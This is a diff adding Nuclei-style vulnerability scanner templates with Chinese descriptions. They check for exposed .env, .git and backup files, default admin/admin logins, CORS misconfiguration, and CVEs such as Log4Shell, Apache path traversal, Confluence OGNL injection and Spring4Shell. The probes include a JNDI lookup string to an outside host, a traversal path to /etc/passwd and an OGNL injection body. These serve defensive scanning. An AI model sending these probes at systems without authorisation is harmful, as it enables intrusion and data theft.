@@ -1,0 +1,291 @@
+# Nuclei 模板 - 信息泄露检测
+templates:
+  # 环境文件泄露
+  - id: env-file-exposure
+    name: ".env 文件泄露"
+    severity: high
+    category: exposure
+    description: 检测 .env 环境配置文件是否对外暴露，包含数据库密码、API密钥等敏感信息
+    remediation: 在 Web 服务器配置中禁止访问 .env 文件，或将其移出 Web 根目录
+    requests:
+      - method: GET
+        path: "{{.BaseURL}}/.env"
+        matchers:
+          - type: word
+            words:
+              - "DB_PASSWORD"
+              - "APP_KEY"
+              - "SECRET"
+              - "MAIL_PASSWORD"
+            condition: or
+          - type: status
+            status:
+              - 200
+    cve_id: ""
+    cvss_score: 7.5
+
+  - id: git-exposure
+    name: ".git 目录泄露"
+    severity: high
+    category: exposure
+    description: 检测 .git 版本控制目录是否对外暴露，可能泄露源代码
+    remediation: 在 Web 服务器配置中禁止访问 .git 目录
+    requests:
+      - method: GET
+        path: "{{.BaseURL}}/.git/HEAD"
+        matchers:
+          - type: word
+            words:
+              - "ref: refs/heads/"
+          - type: status
+            status:
+              - 200
+    cve_id: ""
+    cvss_score: 7.5
+
+  - id: phpinfo-exposure
+    name: "phpinfo 页面泄露"
+    severity: medium
+    category: exposure
+    description: 检测 phpinfo() 输出页面是否对外暴露，可能泄露服务器配置和路径信息
+    remediation: 删除或限制访问 phpinfo.php 页面
+    requests:
+      - method: GET
+        path: "{{.BaseURL}}/phpinfo.php"
+        matchers:
+          - type: word
+            words:
+              - "PHP Version"
+              - "phpinfo()"
+          - type: status
+            status:
+              - 200
+    cve_id: ""
+    cvss_score: 5.3
+
+  - id: backup-file-exposure
+    name: "备份文件泄露"
+    severity: medium
+    category: exposure
+    description: 检测常见备份文件是否对外暴露
+    remediation: 删除 Web 根目录下的备份文件
+    requests:
+      - method: GET
+        path:
+          - "{{.BaseURL}}/backup.zip"
+          - "{{.BaseURL}}/backup.sql"
+          - "{{.BaseURL}}/database.sql"
+          - "{{.BaseURL}}/dump.sql"
+          - "{{.BaseURL}}/site.zip"
+        matchers:
+          - type: status
+            status:
+              - 200
+    cve_id: ""
+    cvss_score: 5.3
+
+  - id: swagger-ui-exposure
+    name: "Swagger UI 暴露"
+    severity: medium
+    category: exposure
+    description: 检测 Swagger API 文档是否对外暴露
+    remediation: 在生产环境中禁用 Swagger UI 或添加认证
+    requests:
+      - method: GET
+        path:
+          - "{{.BaseURL}}/swagger-ui.html"
+          - "{{.BaseURL}}/swagger/index.html"
+          - "{{.BaseURL}}/api-docs"
+        matchers:
+          - type: word
+            words:
+              - "swagger"
+              - "Swagger UI"
+          - type: status
+            status:
+              - 200
+    cve_id: ""
+    cvss_score: 5.3
+
+  # 配置错误
+  - id: directory-listing
+    name: "目录列表暴露"
+    severity: low
+    category: misconfiguration
+    description: 检测 Web 服务器是否启用了目录列表功能
+    remediation: 在 Web 服务器配置中禁用目录列表 (Options -Indexes)
+    requests:
+      - method: GET
+        path:
+          - "{{.BaseURL}}/images/"
+          - "{{.BaseURL}}/uploads/"
+          - "{{.BaseURL}}/assets/"
+        matchers:
+          - type: word
+            words:
+              - "Index of /"
+              - "Directory Listing"
+          - type: status
+            status:
+              - 200
+    cve_id: ""
+    cvss_score: 3.7
+
+  - id: default-credentials
+    name: "默认凭据检测"
+    severity: critical
+    category: default-login
+    description: 检测常见系统是否使用默认凭据
+    remediation: 立即修改默认密码
+    requests:
+      - method: POST
+        path:
+          - "{{.BaseURL}}/login"
+          - "{{.BaseURL}}/admin/login"
+        body: "username=admin&password=admin"
+        matchers:
+          - type: word
+            words:
+              - "success"
+              - "welcome"
+              - "dashboard"
+            condition: or
+    cve_id: ""
+    cvss_score: 9.8
+
+  - id: cors-misconfiguration
+    name: "CORS 配置错误"
+    severity: medium
+    category: misconfiguration
+    description: 检测跨域资源共享配置是否过于宽松
+    remediation: 限制 Access-Control-Allow-Origin 为可信域名
+    requests:
+      - method: OPTIONS
+        path: "{{.BaseURL}}/api"
+        headers:
+          Origin: "https://evil.com"
+        matchers:
+          - type: word
+            words:
+              - "Access-Control-Allow-Origin: https://evil.com"
+              - "Access-Control-Allow-Origin: *"
+            condition: or
+    cve_id: ""
+    cvss_score: 6.5
+
+  # CVE 检测
+  - id: cve-2021-44228-log4j
+    name: "CVE-2021-44228 Log4Shell"
+    severity: critical
+    category: cve
+    description: 检测 Apache Log4j 远程代码执行漏洞 (Log4Shell)
+    remediation: 升级 Log4j 到 2.17.0 或更高版本
+    requests:
+      - method: GET
+        path: "{{.BaseURL}}/"
+        headers:
+          User-Agent: "${jndi:ldap://vulnflow-test.example.com/a}"
+        matchers:
+          - type: word
+            words:
+              - "error"
+              - "exception"
+            condition: or
+    cve_id: "CVE-2021-44228"
+    cvss_score: 10.0
+
+  - id: cve-2021-41773-apache
+    name: "CVE-2021-41773 Apache 路径穿越"
+    severity: critical
+    category: cve
+    description: 检测 Apache HTTP Server 2.4.49 路径穿越漏洞
+    remediation: 升级 Apache HTTP Server 到 2.4.51 或更高版本
+    requests:
+      - method: GET
+        path: "{{.BaseURL}}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        matchers:
+          - type: word
+            words:
+              - "root:"
+    cve_id: "CVE-2021-41773"
+    cvss_score: 7.5
+
+  - id: cve-2021-26084-confluence
+    name: "CVE-2021-26084 Confluence OGNL 注入"
+    severity: critical
+    category: cve
+    description: 检测 Atlassian Confluence OGNL 注入漏洞
+    remediation: 升级 Confluence 到安全版本
+    requests:
+      - method: POST
+        path: "{{.BaseURL}}/pages/createpage-entervariables.action"
+        body: "queryString=aaaa%5Cu0027%2Bexpr%7B1%2B1%7D%2B%5Cu0027bbb"
+        matchers:
+          - type: word
+            words:
+              - "aaa2bbb"
+    cve_id: "CVE-2021-26084"
+    cvss_score: 9.8
+
+  - id: cve-2022-22965-spring4shell
+    name: "CVE-2022-22965 Spring4Shell"
+    severity: critical
+    category: cve
+    description: 检测 Spring Framework 远程代码执行漏洞 (Spring4Shell)
+    remediation: 升级 Spring Framework 到 5.3.18+ 或 5.2.20+
+    requests:
+      - method: GET
+        path: "{{.BaseURL}}/"
+        headers:
+          suffix: "%>//"
+          c1: "Runtime"
+          c2: "<%"
+        matchers:
+          - type: status
+            status:
+              - 200
+    cve_id: "CVE-2022-22965"
+    cvss_score: 9.8
+
+  # 技术栈检测
+  - id: wordpress-detection
+    name: "WordPress 检测"
+    severity: info
+    category: tech-stack
+    description: 检测目标是否为 WordPress 站点
+    remediation: ""
+    requests:
+      - method: GET
+        path:
+          - "{{.BaseURL}}/wp-login.php"
+          - "{{.BaseURL}}/wp-admin"
+        matchers:
+          - type: word
+            words:
+              - "wordpress"
+              - "wp-content"
+              - "wp-includes"
+            condition: or
+    cve_id: ""
+    cvss_score: 0
+
+  - id: spring-boot-actuator
+    name: "Spring Boot Actuator 暴露"
+    severity: medium
+    category: misconfiguration
+    description: 检测 Spring Boot Actuator 端点是否对外暴露
+    remediation: 限制 Actuator 端点访问或添加认证
+    requests:
+      - method: GET
+        path:
+          - "{{.BaseURL}}/actuator"
+          - "{{.BaseURL}}/actuator/env"
+          - "{{.BaseURL}}/actuator/health"
+          - "{{.BaseURL}}/actuator/info"
+          - "{{.BaseURL}}/actuator/mappings"
+        matchers:
+          - type: status
+            status:
+              - 200
+    cve_id: ""
+    cvss_score: 5.3
